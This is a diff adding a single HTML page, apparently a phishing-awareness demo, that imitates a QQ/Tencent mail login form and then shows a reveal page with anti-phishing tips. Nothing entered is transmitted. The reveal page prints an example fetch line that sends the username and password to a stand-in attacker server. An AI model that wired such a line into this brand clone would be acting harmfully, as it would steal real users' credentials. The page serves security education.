@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<!-- ============================================================
+     钓鱼安全教育演示 | Phishing Awareness Demo
+     本页不记录、不存储、不发送任何输入内容。
+     审计指南见 README.md ｜ 源码: github.com/Principia-rain/phishing-demo
+============================================================ -->
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>QQ帐号登录</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3Ctext%20y='0.9em'%20font-size='90'%3E%F0%9F%90%A7%3C/text%3E%3C/svg%3E">
+<style>
+*{box-sizing:border-box}
+body{margin:0;font-family:"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei",Arial,sans-serif;background:linear-gradient(180deg,#dfe9f6 0%,#f0f4fa 100%);min-height:100vh;color:#333}
+a{text-decoration:none}
+
+/* ---------- 登录页 ---------- */
+#app{display:flex;flex-direction:column;min-height:100vh}
+.topbar{height:52px;background:#fff;box-shadow:0 1px 0 #e7eaf0;display:flex;align-items:center;justify-content:space-between;padding:0 26px;position:relative;z-index:2}
+.brand{display:flex;align-items:center;gap:9px;font-size:17px;font-weight:600;color:#333}
+.p-sm{width:26px;height:26px}
+.tlinks{font-size:13px;color:#7a8499}
+.tlinks a{color:#7a8499;margin-left:18px}
+.tlinks a:hover{color:#1479d7}
+main{flex:1;display:flex;justify-content:center;align-items:flex-start;padding:48px 16px 70px}
+.card{width:min(400px,94vw);background:#fff;border-radius:10px;box-shadow:0 8px 32px rgba(50,80,140,.14);padding:30px 36px 24px;text-align:center}
+.p-big{width:88px;height:88px;margin:2px auto 6px;display:block}
+.card h1{font-size:21px;font-weight:500;color:#2f3338;margin:0 0 14px}
+.tabs{display:flex;justify-content:center;gap:36px;border-bottom:1px solid #eceef3;margin-bottom:10px}
+.tab{padding:10px 2px 9px;font-size:15px;color:#6b7484;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-1px}
+.tab.active{color:#1479d7;border-bottom-color:#1479d7}
+.err{color:#e64545;font-size:13px;min-height:20px;margin:2px 0 0;display:none}
+.field{position:relative;margin:10px 0}
+.ico{position:absolute;left:13px;top:50%;transform:translateY(-50%);width:16px;height:16px;color:#b3bac6}
+.field input{width:100%;height:44px;border:1px solid #dcdfe7;border-radius:4px;padding:0 12px 0 38px;font-size:15px;color:#333;outline:none;transition:border-color .15s}
+.field input:focus{border-color:#1479d7}
+.field input.bad{border-color:#e64545}
+.opts{display:flex;justify-content:space-between;align-items:center;margin:12px 2px 16px;font-size:13px}
+.chk{display:flex;align-items:center;gap:6px;color:#7a8499;cursor:pointer}
+.chk input{accent-color:#1479d7}
+.dim{color:#7a8499}
+.dim:hover{color:#1479d7}
+.btn{width:100%;height:44px;border:none;border-radius:4px;background:#1479d7;color:#fff;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;transition:background .15s}
+.btn:hover{background:#2b86e0}
+.btn:disabled{opacity:.85;cursor:default}
+.spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.reg{margin-top:16px;font-size:13px}
+.reg a{color:#1479d7}
+.qrwrap{padding:4px 0 6px}
+#qr{border:1px solid #eceef3;border-radius:4px}
+.qrwrap p{font-size:13px;color:#7a8499;margin:10px 0 4px}
+.pfoot{text-align:center;padding:20px 12px 26px;font-size:12px;color:#98a1b3;line-height:1.9}
+.pfoot a{color:#98a1b3;margin:0 6px}
+.pfoot a:hover{color:#1479d7}
+
+/* ---------- 揭示页 ---------- */
+#reveal{display:none;position:fixed;inset:0;background:#f5f9fc;overflow:auto;z-index:60}
+body.revealed #app{display:none}
+body.revealed #reveal{display:block}
+.rv{max-width:660px;margin:0 auto;padding:46px 20px 50px}
+.rv-emoji{text-align:center;font-size:56px}
+#reveal h2{text-align:center;font-size:30px;margin:8px 0 6px;color:#1f2733}
+.rv-sub{text-align:center;color:#5b6675;font-size:15px;margin:0 0 8px}
+.rv-card{background:#fff;border-radius:12px;padding:20px 22px;box-shadow:0 4px 20px rgba(40,70,120,.08);margin-top:18px}
+.rv-card h3{margin:0 0 12px;font-size:17px;color:#22303f}
+.cap{display:flex;gap:12px;align-items:center;padding:6px 0;font-size:15px;flex-wrap:wrap}
+.cap-k{color:#8a93a5;font-size:13px;width:34px}
+.blurred{filter:blur(7px);cursor:pointer;user-select:none;font-family:Consolas,monospace;background:#f2f4f8;padding:2px 10px;border-radius:4px;word-break:break-all}
+.cap-tip{color:#a3abbc;font-size:12px}
+.cap-warn{margin:12px 0 0;padding:10px 12px;background:#fff6e8;border:1px solid #f5dfae;border-radius:8px;color:#8a6116;font-size:13.5px}
+.proof{margin:0;padding-left:4px;list-style:none}
+.proof li{padding:5px 0;font-size:14.5px;color:#3c4757;line-height:1.8}
+.proof li::before{content:"✓";color:#189e6b;font-weight:700;margin-right:8px}
+.howto{margin-top:14px;background:#f2f7fd;border:1px solid #d7e5f5;border-radius:8px;padding:12px 14px;font-size:13.5px;color:#3c4757}
+.howto ol{margin:8px 0 0;padding-left:20px}
+kbd{background:#fff;border:1px solid #ccd5e0;border-bottom-width:2px;border-radius:4px;padding:1px 6px;font-size:12px}
+.src{margin:14px 0 0;font-size:13.5px}
+.src a{color:#1479d7;font-weight:600}
+pre{background:#252b36;color:#e8ecf3;border-radius:8px;padding:12px 14px;font-size:13px;overflow:auto;margin:12px 0}
+.rv-card p{font-size:14.5px;color:#3c4757;line-height:1.8;margin:8px 0}
+.tip{display:flex;gap:12px;padding:8px 0;font-size:14.5px;color:#3c4757;line-height:1.75}
+.tip .n{flex:0 0 24px;height:24px;border-radius:50%;background:#1479d7;color:#fff;font-size:13px;display:flex;align-items:center;justify-content:center;margin-top:3px}
+.rv-actions{text-align:center;margin-top:26px;display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.btn2{padding:11px 24px;border-radius:8px;border:1.5px solid #1479d7;background:#1479d7;color:#fff;font-size:15px;cursor:pointer}
+.btn2.ghost{background:#fff;color:#1479d7}
+.btn2:hover{filter:brightness(1.08)}
+.rv-foot{text-align:center;color:#98a3b5;font-size:12.5px;margin-top:22px}
+</style>
+</head>
+<body>
+
+<!-- 企鹅图形（内联 SVG，无外部资源） -->
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <symbol id="penguin" viewBox="0 0 120 120">
+    <ellipse cx="60" cy="72" rx="34" ry="36" fill="#22272e"/>
+    <circle cx="60" cy="34" r="24" fill="#22272e"/>
+    <ellipse cx="60" cy="40" rx="16" ry="13" fill="#fff"/>
+    <circle cx="53" cy="34" r="2.6" fill="#22272e"/>
+    <circle cx="67" cy="34" r="2.6" fill="#22272e"/>
+    <path d="M53 41 L67 41 L60 49 Z" fill="#f7a800"/>
+    <ellipse cx="60" cy="76" rx="18" ry="20" fill="#fff"/>
+    <path d="M38 54 Q60 64 82 54 L82 62 Q60 72 38 62 Z" fill="#e03d3d"/>
+    <path d="M78 60 L88 78 L80 80 L72 64 Z" fill="#e03d3d"/>
+    <ellipse cx="24" cy="70" rx="9" ry="20" fill="#22272e" transform="rotate(14 24 70)"/>
+    <ellipse cx="96" cy="70" rx="9" ry="20" fill="#22272e" transform="rotate(-14 96 70)"/>
+    <ellipse cx="46" cy="106" rx="10" ry="5" fill="#f7a800"/>
+    <ellipse cx="74" cy="106" rx="10" ry="5" fill="#f7a800"/>
+  </symbol>
+</svg>
+
+<div id="app">
+  <header class="topbar">
+    <div class="brand"><svg class="p-sm"><use href="#penguin"/></svg>QQ邮箱</div>
+    <nav class="tlinks"><a href="javascript:void(0)">简体中文</a><a href="javascript:void(0)">手机版</a><a href="javascript:void(0)">帮助</a></nav>
+  </header>
+
+  <main>
+    <div class="card">
+      <svg class="p-big"><use href="#penguin"/></svg>
+      <h1>帐号登录</h1>
+
+      <div class="tabs">
+        <div class="tab active" id="tabAcc">帐号密码登录</div>
+        <div class="tab" id="tabQr">扫码登录</div>
+      </div>
+      <div class="err" id="err"></div>
+
+      <form id="loginForm" novalidate>
+        <div id="panelAcc">
+          <div class="field">
+            <svg class="ico" viewBox="0 0 24 24"><path d="M12 12a4.5 4.5 0 1 0-4.5-4.5A4.5 4.5 0 0 0 12 12zm0 2c-4.1 0-8 2.1-8 5v1.5h16V19c0-2.9-3.9-5-8-5z" fill="currentColor"/></svg>
+            <input id="user" type="text" placeholder="QQ号码/手机/邮箱" autocomplete="off">
+          </div>
+          <div class="field">
+            <svg class="ico" viewBox="0 0 24 24"><path d="M17 10V8a5 5 0 0 0-10 0v2H6a1.5 1.5 0 0 0-1.5 1.5v8A1.5 1.5 0 0 0 6 21h12a1.5 1.5 0 0 0 1.5-1.5v-8A1.5 1.5 0 0 0 18 10zM9 8a3 3 0 0 1 6 0v2H9z" fill="currentColor"/></svg>
+            <input id="pass" type="password" placeholder="QQ密码" autocomplete="off">
+          </div>
+          <div class="opts">
+            <label class="chk"><input type="checkbox" id="auto">自动登录</label>
+            <a class="dim" href="javascript:void(0)">忘记密码？</a>
+          </div>
+          <button class="btn" id="btn" type="submit">登　录</button>
+          <div class="reg"><a href="javascript:void(0)">注册新账号</a></div>
+        </div>
+      </form>
+
+      <div id="panelQr" class="qrwrap" style="display:none">
+        <canvas id="qr" width="150" height="150"></canvas>
+        <p>请使用手机QQ扫描二维码登录</p>
+      </div>
+    </div>
+  </main>
+
+  <footer class="pfoot">
+    <p><a href="javascript:void(0)">关于腾讯</a>|<a href="javascript:void(0)">服务条款</a>|<a href="javascript:void(0)">隐私政策</a>|<a href="javascript:void(0)">客服中心</a></p>
+    <p>Copyright © 1998 - 2026 Tencent. All Rights Reserved</p>
+  </footer>
+</div>
+
+<!-- ============ 揭示页（输完密码后立刻出现） ============ -->
+<section id="reveal">
+  <div class="rv">
+    <div class="rv-emoji">🎣</div>
+    <h2>你被"钓鱼"了</h2>
+    <p class="rv-sub">别慌——这是一次<b>安全教育演示</b>。你现在看到的就是"钓鱼网站得手后"的样子。</p>
+
+    <div class="rv-card">
+      <h3>你刚才输入了</h3>
+      <div class="cap"><span class="cap-k">账号</span><b id="accShow"></b></div>
+      <div class="cap"><span class="cap-k">密码</span><span id="pwShow" class="blurred" title="点击显示 / 隐藏"></span><span class="cap-tip">（点击密码可显示）</span></div>
+      <p class="cap-warn">如果是真正的钓鱼网站，这两行信息此刻已经发到了攻击者的服务器。</p>
+    </div>
+
+    <div class="rv-card">
+      <h3>你的信息去哪了？—— <em>哪儿也没去</em></h3>
+      <ul class="proof">
+        <li>本页加载的<b>外部资源：<span id="evExt">0</span> 个</b>——没有第三方脚本、图片或统计代码，你输入的内容在物理上无处可发</li>
+        <li>点击"登录"后发出的<b>网络请求：0 个</b>——整个源码中不存在 fetch / XMLHttpRequest / sendBeacon</li>
+        <li>写入的 <b>cookie / localStorage / 日志：0 条</b>——关闭页面后，你输入的一切彻底消失</li>
+      </ul>
+      <div class="howto">
+        <b>别信我，信 F12 —— 30 秒自查：</b>
+        <ol>
+          <li>按 <kbd>F12</kbd> 打开开发者工具 → Network（网络）面板 → 勾选 Preserve log</li>
+          <li>点下方"再来一次"，重新输入任意账号密码并登录</li>
+          <li>观察 Network 面板：不会出现任何新请求；Application 面板里也没有任何 cookie / localStorage 写入</li>
+        </ol>
+      </div>
+      <p class="src">本网站 100% 开源，全部代码只有一个 index.html，欢迎逐行审计：<a href="https://github.com/Principia-rain/phishing-demo" target="_blank" rel="noopener">github.com/Principia-rain/phishing-demo</a></p>
+    </div>
+
+    <div class="rv-card">
+      <h3>真钓鱼站此刻会做什么？</h3>
+      <p>它只需要一行你在本站源码里永远找不到的代码：</p>
+      <pre>fetch('https://攻击者的服务器/steal?u=' + 账号 + '&p=' + 密码)</pre>
+      <p>拿到密码后，通常立刻把你跳转到真正的官网——你会以为只是"第一次密码输错了"。整个过程不超过 1 秒。</p>
+    </div>
+
+    <div class="rv-card">
+      <h3>防钓鱼三招</h3>
+      <div class="tip"><span class="n">1</span><div><b>认域名</b>：腾讯只有 qq.com。qq-mail-secure.xyz、qq.com.verify-login.cn 这类都是假的；小心 0/o、1/l、rn/m 的视觉仿写。</div></div>
+      <div class="tip"><span class="n">2</span><div><b>别迷信小锁</b>：🔒 HTTPS 只说明"传输加密"，不说明"网站可信"——钓鱼站也能弄到绿锁。</div></div>
+      <div class="tip"><span class="n">3</span><div><b>走人工通道</b>：重要账号开启设备锁/两步验证；尽量不点邮件和短信里的登录链接，自己敲域名或用官方 App。</div></div>
+    </div>
+
+    <div class="rv-actions">
+      <button class="btn2" id="again">再来一次</button>
+      <a class="btn2 ghost" href="https://github.com/Principia-rain/phishing-demo" target="_blank" rel="noopener">查看源码 →</a>
+    </div>
+    <p class="rv-foot">本页面仅用于信息安全教育演示 · 你输入的一切都没有被记录</p>
+  </div>
+</section>
+
+<script>
+(function(){
+  var $=function(s){return document.querySelector(s)};
+  var err=$('#err'),user=$('#user'),pass=$('#pass'),btn=$('#btn');
+  var tabAcc=$('#tabAcc'),tabQr=$('#tabQr'),panelAcc=$('#panelAcc'),panelQr=$('#panelQr');
+
+  /* 伪二维码：纯本地随机装饰图，不含任何信息 */
+  function drawQR(){
+    var c=$('#qr'),ctx=c.getContext('2d'),n=29,s=c.width/n,seed=9527;
+    function rnd(){seed=(seed*1103515245+12345)%2147483648;return seed/2147483648;}
+    ctx.fillStyle='#fff';ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle='#20242c';
+    function finder(x,y){
+      ctx.fillStyle='#20242c';ctx.fillRect(x*s,y*s,7*s,7*s);
+      ctx.fillStyle='#fff';ctx.fillRect((x+1)*s,(y+1)*s,5*s,5*s);
+      ctx.fillStyle='#20242c';ctx.fillRect((x+2)*s,(y+2)*s,3*s,3*s);
+    }
+    for(var i=0;i<n;i++)for(var j=0;j<n;j++){
+      var inF=(i<8&&j<8)||(i>n-9&&j<8)||(i<8&&j>n-9);
+      if(inF)continue;
+      if(rnd()<0.44)ctx.fillRect(i*s,j*s,s,s);
+    }
+    finder(0,0);finder(n-7,0);finder(0,n-7);
+  }
+
+  function setTab(acc){
+    tabAcc.classList.toggle('active',acc);
+    tabQr.classList.toggle('active',!acc);
+    panelAcc.style.display=acc?'':'none';
+    panelQr.style.display=acc?'none':'';
+    err.style.display='none';
+    if(!acc)drawQR();
+  }
+  tabAcc.addEventListener('click',function(){setTab(true)});
+  tabQr.addEventListener('click',function(){setTab(false)});
+
+  function clearBad(){this.classList.remove('bad');err.style.display='none';}
+  user.addEventListener('input',clearBad);
+  pass.addEventListener('input',clearBad);
+
+  $('#loginForm').addEventListener('submit',function(e){
+    e.preventDefault();
+    user.classList.remove('bad');pass.classList.remove('bad');
+    if(!user.value.trim()){err.textContent='您还没有输入帐号';err.style.display='block';user.classList.add('bad');user.focus();return;}
+    if(!pass.value){err.textContent='您还没有输入密码';err.style.display='block';pass.classList.add('bad');pass.focus();return;}
+    err.style.display='none';
+    btn.disabled=true;
+    btn.innerHTML='<span class="spinner"></span>登录中';
+    setTimeout(reveal,1400);
+  });
+
+  /* 揭示：只在本机内存里展示输入内容，不发送任何东西 */
+  function reveal(){
+    $('#accShow').textContent=user.value;
+    $('#pwShow').textContent=pass.value;
+    var ext=0;
+    try{
+      ext=performance.getEntriesByType('resource').filter(function(r){
+        return r.name.indexOf(location.origin)!==0;
+      }).length;
+    }catch(e){}
+    $('#evExt').textContent=ext;
+    document.body.classList.add('revealed');
+    document.title='\uD83C\uDFA3 你被钓鱼了（安全演示）';
+    window.scrollTo(0,0);
+  }
+
+  $('#pwShow').addEventListener('click',function(){this.classList.toggle('blurred')});
+  $('#again').addEventListener('click',function(){location.reload()});
+})();
+</script>
+</body>
+</html>
